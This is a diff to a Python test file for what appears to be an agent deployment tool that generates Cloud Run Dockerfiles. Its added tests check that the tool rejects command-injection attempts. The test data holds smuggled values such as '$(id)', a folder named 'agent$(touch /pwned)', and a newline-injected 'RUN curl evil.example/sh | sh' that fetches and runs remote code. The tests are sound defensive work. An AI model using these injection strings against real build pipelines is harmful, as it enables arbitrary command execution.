@@ -16,6 +16,7 @@
 
 from __future__ import annotations
 
+import json
 from pathlib import Path
 import shutil
 import subprocess
@@ -41,6 +42,14 @@ class AgentDirFixture(Protocol):
 
 
 # Helpers
+def _parse_cmd_argv(dockerfile_content: str) -> List[str]:
+  """Extracts and parses the JSON array from a Dockerfile CMD instruction."""
+  for line in dockerfile_content.splitlines():
+    if line.startswith("CMD "):
+      return json.loads(line[len("CMD ") :])
+  raise AssertionError("No CMD line found in Dockerfile")
+
+
 class _Recorder:
   """A callable object that records every invocation."""
 
@@ -146,30 +155,37 @@ def test_to_cloud_run_happy_path(
   assert dockerfile_path.is_file()
   dockerfile_content = dockerfile_path.read_text()
 
-  expected_command = "api_server --with_ui" if with_ui else "api_server"
-  assert f"CMD adk {expected_command} --port=8080" in dockerfile_content
+  cmd_argv = _parse_cmd_argv(dockerfile_content)
+  assert cmd_argv[0] == "adk"
+  if with_ui:
+    assert cmd_argv[1:3] == ["api_server", "--with_ui"]
+  else:
+    assert cmd_argv[1] == "api_server"
+    assert "--with_ui" not in cmd_argv
+  assert "--port=8080" in cmd_argv
+  assert cmd_argv[-1] == "/app/agents"
   assert "FROM python:3.11-slim" in dockerfile_content
   assert (
       'RUN adduser --disabled-password --gecos "" myuser' in dockerfile_content
   )
   assert "USER myuser" in dockerfile_content
-  assert 'RUN pip install "google-adk[a2a]==1.3.0"' in dockerfile_content
-  assert "--trace_to_cloud" in dockerfile_content
-  assert "--otel_to_cloud" in dockerfile_content
+  assert (
+      'RUN ["pip", "install", "google-adk[a2a,gcp,otel-gcp]==1.3.0"]'
+      in dockerfile_content
+  )
+  assert "--trace_to_cloud" in cmd_argv
+  assert "--otel_to_cloud" in cmd_argv
 
   # Check agent dependencies installation based on include_requirements
   if include_requirements:
     assert (
-        'RUN pip install -r "/app/agents/agent/requirements.txt"'
+        'RUN ["pip", "install", "-r", "/app/agents/agent/requirements.txt"]'
         in dockerfile_content
     )
   else:
     assert "# No requirements.txt found." in dockerfile_content
 
-  assert (
-      "--allow_origins=http://localhost:3000,https://my-app.com"
-      in dockerfile_content
-  )
+  assert "--allow_origins=http://localhost:3000,https://my-app.com" in cmd_argv
 
   assert len(run_recorder.calls) == 1
   gcloud_args = run_recorder.get_last_call_args()[0]
@@ -197,6 +213,167 @@ def test_to_cloud_run_happy_path(
   assert gcloud_args == expected_gcloud_command
 
   assert str(rmtree_recorder.get_last_call_args()[0]) == str(tmp_path)
+
+
+@pytest.mark.parametrize(
+    "trace_to_cloud, otel_to_cloud, expected_extras",
+    [
+        (False, False, "a2a"),
+        (True, False, "a2a,gcp,otel-gcp"),
+        (False, True, "a2a,gcp,otel-gcp"),
+        (True, True, "a2a,gcp,otel-gcp"),
+    ],
+)
+def test_to_cloud_run_installs_telemetry_extras(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: AgentDirFixture,
+    tmp_path: Path,
+    trace_to_cloud: bool,
+    otel_to_cloud: bool,
+    expected_extras: str,
+) -> None:
+  """The container must install the extras the telemetry flags need."""
+  src_dir = agent_dir(include_requirements=False, include_env=False)
+  monkeypatch.setattr(subprocess, "run", _Recorder())
+  monkeypatch.setattr(shutil, "rmtree", _Recorder())
+
+  cli_deploy.run(
+      agent_folder=str(src_dir),
+      provider="cloud_run",
+      project="proj",
+      region="us-central1",
+      service_name="svc",
+      app_name="agent",
+      temp_folder=str(tmp_path),
+      port=8080,
+      trace_to_cloud=trace_to_cloud,
+      otel_to_cloud=otel_to_cloud,
+      with_ui=False,
+      log_level="info",
+      verbosity="info",
+      adk_version="1.3.0",
+  )
+
+  dockerfile_content = (tmp_path / "Dockerfile").read_text()
+  assert (
+      f'RUN ["pip", "install", "google-adk[{expected_extras}]==1.3.0"]'
+      in dockerfile_content
+  )
+
+
+def test_to_cloud_run_extra_packages_staged_and_copied_into_image(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: AgentDirFixture,
+    tmp_path: Path,
+) -> None:
+  """An extra package is staged and copied into the image."""
+  src_dir = agent_dir(include_requirements=False, include_env=False)
+  build_dir = tmp_path / "build"
+  shared_dir = tmp_path / "common"
+  shared_dir.mkdir()
+  (shared_dir / "helper.py").write_text("VALUE = 1\n")
+
+  monkeypatch.setattr(subprocess, "run", _Recorder())
+  monkeypatch.setattr(shutil, "rmtree", _Recorder())
+
+  cli_deploy.run(
+      agent_folder=str(src_dir),
+      provider="cloud_run",
+      project="proj",
+      region="us-central1",
+      service_name="svc",
+      app_name="agent",
+      temp_folder=str(build_dir),
+      port=8080,
+      trace_to_cloud=False,
+      otel_to_cloud=False,
+      with_ui=False,
+      log_level="info",
+      verbosity="info",
+      adk_version="1.3.0",
+      extra_packages=[str(shared_dir)],
+  )
+
+  assert (build_dir / "common" / "helper.py").is_file()
+  dockerfile_content = (build_dir / "Dockerfile").read_text()
+  assert (
+      'COPY --chown=myuser:myuser "common/" "/app/common/"'
+      in dockerfile_content
+  )
+  assert 'ENV PYTHONPATH="/app:$PYTHONPATH"' in dockerfile_content
+
+
+def test_to_cloud_run_extra_packages_relative_path_resolves_against_cwd(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: AgentDirFixture,
+    tmp_path: Path,
+) -> None:
+  """A relative extra_packages entry resolves against the current directory."""
+  src_dir = agent_dir(include_requirements=False, include_env=False)
+  build_dir = tmp_path / "build"
+  shared_dir = tmp_path / "common"
+  shared_dir.mkdir()
+  (shared_dir / "helper.py").write_text("VALUE = 1\n")
+
+  monkeypatch.setattr(subprocess, "run", _Recorder())
+  monkeypatch.setattr(shutil, "rmtree", _Recorder())
+  monkeypatch.chdir(tmp_path)
+
+  cli_deploy.run(
+      agent_folder=str(src_dir),
+      provider="cloud_run",
+      project="proj",
+      region="us-central1",
+      service_name="svc",
+      app_name="agent",
+      temp_folder=str(build_dir),
+      port=8080,
+      trace_to_cloud=False,
+      otel_to_cloud=False,
+      with_ui=False,
+      log_level="info",
+      verbosity="info",
+      adk_version="1.3.0",
+      extra_packages=["common"],
+  )
+
+  assert (build_dir / "common" / "helper.py").is_file()
+
+
+def test_to_cloud_run_extra_packages_dockerfile_name_raises(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: AgentDirFixture,
+    tmp_path: Path,
+) -> None:
+  """An extra package named Dockerfile would clobber the generated one."""
+  src_dir = agent_dir(include_requirements=False, include_env=False)
+  clashing_file = tmp_path / "outside" / "Dockerfile"
+  clashing_file.parent.mkdir(parents=True)
+  clashing_file.write_text("FROM scratch\n")
+
+  monkeypatch.setattr(subprocess, "run", _Recorder())
+  monkeypatch.setattr(shutil, "rmtree", _Recorder())
+
+  with pytest.raises(click.ClickException) as exc_info:
+    cli_deploy.run(
+        agent_folder=str(src_dir),
+        provider="cloud_run",
+        project="proj",
+        region="us-central1",
+        service_name="svc",
+        app_name="agent",
+        temp_folder=str(tmp_path / "build"),
+        port=8080,
+        trace_to_cloud=False,
+        otel_to_cloud=False,
+        with_ui=False,
+        log_level="info",
+        verbosity="info",
+        adk_version="1.3.0",
+        extra_packages=[str(clashing_file)],
+    )
+
+  assert "conflicting name" in str(exc_info.value)
 
 
 def test_to_cloud_run_cleans_temp_dir(
@@ -560,3 +737,244 @@ def test_run_allows_omitting_project_and_region_for_docker(
       adk_version="1.0.0",
   )
   assert len(run_recorder.calls) == 2
+
+
+_MALICIOUS_APP_NAMES = [
+    "foo$(id)bar",
+    "foo`id`bar",
+    'foo"bar',
+    "foo\nRUN evil",
+    "../escape",
+    "foo/bar",
+    "foo bar",
+]
+
+
+@pytest.mark.parametrize("malicious_app_name", _MALICIOUS_APP_NAMES)
+def test_render_dockerfile_rejects_malicious_app_name(
+    malicious_app_name: str,
+) -> None:
+  """`_render_dockerfile` should reject invalid `app_name` even if called directly."""
+  with pytest.raises((click.ClickException, ValueError)):
+    cli_deploy._render_dockerfile(
+        app_name=malicious_app_name,
+        port=8080,
+        command="api_server",
+        install_agent_deps="# No requirements.txt found.",
+        service_options=[],
+        trace_to_cloud_option="",
+        otel_to_cloud_option="",
+        allow_origins_option="",
+        adk_version="1.3.0",
+        host_option="--host=0.0.0.0",
+        a2a_option="",
+        trigger_sources_option="",
+        gemini_enterprise_option="",
+        express_mode_option="",
+        extra_packages_copy="",
+    )
+
+
+@pytest.mark.parametrize(
+    "field,value",
+    [
+        ("adk_version", "1.3.0\nRUN curl evil.example/sh | sh"),
+        ("port", "8080\nRUN evil"),
+        ("port", "8080\rRUN evil"),
+    ],
+)
+def test_render_dockerfile_rejects_injected_instructions(
+    field: str, value: Any
+) -> None:
+  """A newline in an interpolated value would start a new Dockerfile line."""
+  kwargs: Dict[str, Any] = {
+      "app_name": "safe_agent",
+      "port": 8080,
+      "command": "api_server",
+      "install_agent_deps": "# No requirements.txt found.",
+      "service_options": [],
+      "trace_to_cloud_option": "",
+      "otel_to_cloud_option": "",
+      "allow_origins_option": "",
+      "adk_version": "1.3.0",
+      "host_option": "--host=0.0.0.0",
+      "a2a_option": "",
+      "trigger_sources_option": "",
+      "gemini_enterprise_option": "",
+      "express_mode_option": "",
+      "extra_packages_copy": "",
+  }
+  kwargs[field] = value
+  with pytest.raises(click.ClickException, match="line breaks"):
+    cli_deploy._render_dockerfile(**kwargs)
+
+
+@pytest.mark.parametrize("malicious_app_name", _MALICIOUS_APP_NAMES)
+def test_to_cloud_run_rejects_malicious_app_name(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: AgentDirFixture,
+    tmp_path: Path,
+    malicious_app_name: str,
+) -> None:
+  """`run` aborts before staging anything or invoking gcloud."""
+  src_dir = agent_dir(include_requirements=True, include_env=False)
+  run_recorder = _Recorder()
+  monkeypatch.setattr(subprocess, "run", run_recorder)
+  monkeypatch.setattr(shutil, "rmtree", lambda *_a, **_k: None)
+
+  with pytest.raises(click.ClickException):
+    cli_deploy.run(
+        agent_folder=str(src_dir),
+        provider="cloud_run",
+        project="proj",
+        region="us-central1",
+        service_name="svc",
+        app_name=malicious_app_name,
+        temp_folder=str(tmp_path),
+        port=8080,
+        trace_to_cloud=False,
+        otel_to_cloud=False,
+        with_ui=False,
+        log_level="info",
+        verbosity="info",
+        adk_version="1.3.0",
+        provider_args=(),
+        env=(),
+    )
+
+  assert not run_recorder.calls, "gcloud must not be invoked"
+  assert not (tmp_path / "Dockerfile").exists()
+
+
+def test_to_cloud_run_rejects_malicious_agent_folder_basename(
+    monkeypatch: pytest.MonkeyPatch,
+    tmp_path: Path,
+) -> None:
+  """The default app name comes from the folder basename; it is validated too.
+
+  This is the reported attack: cloning a template whose directory name carries
+  a command substitution and running `adk deploy` on it.
+  """
+  src_dir = tmp_path / "src" / "agent$(touch /pwned)"
+  src_dir.mkdir(parents=True)
+  (src_dir / "agent.py").write_text("# dummy agent")
+  (src_dir / "__init__.py").write_text("from . import agent")
+  (src_dir / "requirements.txt").write_text("pytest\n")
+
+  run_recorder = _Recorder()
+  monkeypatch.setattr(subprocess, "run", run_recorder)
+  monkeypatch.setattr(shutil, "rmtree", lambda *_a, **_k: None)
+
+  temp_folder = tmp_path / "build"
+  with pytest.raises(click.ClickException):
+    cli_deploy.run(
+        agent_folder=str(src_dir),
+        provider="cloud_run",
+        project="proj",
+        region="us-central1",
+        service_name="svc",
+        app_name="",
+        temp_folder=str(temp_folder),
+        port=8080,
+        trace_to_cloud=False,
+        otel_to_cloud=False,
+        with_ui=False,
+        log_level="info",
+        verbosity="info",
+        adk_version="1.3.0",
+        provider_args=(),
+        env=(),
+    )
+
+  assert not run_recorder.calls, "gcloud must not be invoked"
+  assert not (temp_folder / "Dockerfile").exists()
+
+
+def test_dockerfile_run_and_cmd_use_exec_form() -> None:
+  """No interpolated `RUN`/`CMD` in the generated Dockerfile is left in shell form."""
+  rendered = cli_deploy._render_dockerfile(
+      app_name="my_agent",
+      port=8080,
+      command="api_server --with_ui",
+      install_agent_deps=cli_deploy._render_install_agent_deps(
+          "my_agent", __file__, "# No requirements.txt found."
+      ),
+      service_options=[
+          "--session_service_uri=sqlite:///tmp/s.db?mode=ro&cache=shared",
+          "--artifact_service_uri=gs://bucket/path",
+          "--memory_service_uri=rag://corpus",
+      ],
+      trace_to_cloud_option="--trace_to_cloud",
+      otel_to_cloud_option="--otel_to_cloud",
+      allow_origins_option="--allow_origins=https://example.com",
+      adk_version="1.3.0",
+      host_option="--host=0.0.0.0",
+      a2a_option="--a2a",
+      trigger_sources_option="--trigger_sources=pubsub,eventarc",
+      trigger_oidc_audience_option=(
+          "--trigger_oidc_audience=https://aud.example.com"
+      ),
+      trigger_oidc_service_accounts_option=(
+          "--trigger_oidc_service_accounts=sa@project.iam.gserviceaccount.com"
+      ),
+      gemini_enterprise_option="--gemini_enterprise_app_name=my_agent",
+      express_mode_option="--express_mode",
+      extra_packages_copy='COPY --chown=myuser:myuser "pkg/" "/app/pkg/"',
+  )
+  for line in rendered.splitlines():
+    stripped = line.strip()
+    if stripped.startswith(("RUN ", "CMD ", "ENTRYPOINT ")):
+      payload = stripped.split(" ", 1)[1]
+      if stripped.startswith("RUN ") and (
+          "adduser" in stripped or "dev_server" in stripped
+      ):
+        # Static instructions with no interpolated values; intentionally left in
+        # shell form.
+        continue
+      assert payload.startswith("[") and payload.endswith(
+          "]"
+      ), f"instruction is in shell form and would be run by /bin/sh: {line}"
+      args = json.loads(payload)
+      assert isinstance(args, list)
+      assert all(isinstance(a, str) for a in args)
+      assert "" not in args, "empty argv entries confuse the CLI parser"
+
+
+def test_service_uri_shell_metacharacters_are_not_shell_interpreted(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: AgentDirFixture,
+    tmp_path: Path,
+) -> None:
+  """URIs containing `&`, `;`, `$()`, or quotes must be passed verbatim in exec-form CMD."""
+  src_dir = agent_dir(include_requirements=False, include_env=False)
+  monkeypatch.setattr(subprocess, "run", _Recorder())
+  monkeypatch.setattr(shutil, "rmtree", lambda *_a, **_k: None)
+
+  tricky_uri = (
+      'postgresql://user:p@ss@host/db?sslmode=require&options=$(id);"x"'
+  )
+  cli_deploy.run(
+      agent_folder=str(src_dir),
+      provider="cloud_run",
+      project="proj",
+      region="us-central1",
+      service_name="svc",
+      app_name="safe_agent",
+      temp_folder=str(tmp_path),
+      port=8080,
+      trace_to_cloud=False,
+      otel_to_cloud=False,
+      with_ui=False,
+      log_level="info",
+      verbosity="info",
+      adk_version="1.3.0",
+      session_service_uri=tricky_uri,
+      artifact_service_uri=None,
+      memory_service_uri=None,
+      provider_args=(),
+      env=(),
+  )
+
+  dockerfile_content = (tmp_path / "Dockerfile").read_text()
+  cmd_argv = _parse_cmd_argv(dockerfile_content)
+  assert f"--session_service_uri={tricky_uri}" in cmd_argv
